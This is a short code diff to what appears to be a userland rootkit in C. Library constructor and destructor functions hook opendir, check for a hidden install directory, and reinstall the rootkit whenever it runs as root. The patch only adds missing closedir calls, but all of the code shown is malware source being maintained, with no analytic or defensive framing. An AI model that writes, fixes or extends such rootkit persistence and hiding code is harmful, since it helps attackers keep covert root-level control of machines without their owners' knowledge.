@@ -307,6 +307,7 @@ void __attribute ((constructor)) init (void)
     HOOK(old_opendir, COPENDIR);
     DIR *check_presence = old_opendir(install_dir); // does our hidden directory still exist?
     if(check_presence && errno != ENOENT && geteuid() == 0) { closedir(check_presence); reinstall(); } // then REWRITE IT AAAALL
+    if(check_presence) closedir(check_presence);
     CLEAN(install_dir);
 }
 
@@ -316,5 +317,6 @@ void __attribute ((destructor)) vexit (void)
     HOOK(old_opendir, COPENDIR);
     DIR *check_presence = old_opendir(install_dir);
     if(check_presence && errno != ENOENT && geteuid() == 0) { closedir(check_presence); reinstall(); }
+    if(check_presence) closedir(check_presence);
     CLEAN(install_dir);
 }
